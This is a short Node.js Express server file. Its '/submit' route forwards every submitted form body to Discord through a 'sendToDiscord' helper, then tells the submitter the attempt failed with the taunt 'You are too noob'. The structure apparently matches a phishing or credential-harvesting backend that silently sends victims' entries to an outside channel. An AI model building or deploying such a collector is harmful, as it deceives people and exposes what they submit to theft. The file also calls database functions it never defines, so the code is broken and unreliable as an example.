import 'dotenv/config';
import express from "express"
import { pages } from "./server/pages.js"
import cors from "cors"
import { sendToDiscord } from './server/sendToDiscord.js';

const PORT =process.env.port||4000

const app = express()

app.use(cors(),express.json(),express.urlencoded({ extended: true }))
app.use(pages)

app.post('/submit',(req,res)=>{
  const data =req.body
  sendToDiscord(data)
  res.json({
    ok:false,
    message:"You are too noob"
  })
})

async function startServer() {
  try {
    // Connect to MongoDB first
    await dbConnection();
    
    // Then start the Express server
    const server= app.listen(PORT,(err)=>{
      if (err) {
        console.log(err);
      } else {
        console.log(`Server started on http://localhost:${PORT}`);
      }
    });
    // Handle graceful shutdown
    process.on('SIGTERM', async () => {
      console.log('SIGTERM received. Shutting down gracefully...');
      server.close(async () => {
        await closeDBConnection();
        console.log('Server closed');
        process.exit(0);
      });
    });

    process.on('SIGINT', async () => {
      console.log('SIGINT received. Shutting down gracefully...');
      server.close(async () => {
        await closeDBConnection();
        console.log('Server closed');
        process.exit(0);
      });
    });
  } catch (error) {
    console.error('Failed to start server:', error);
    process.exit(1);
  }
}

startServer();
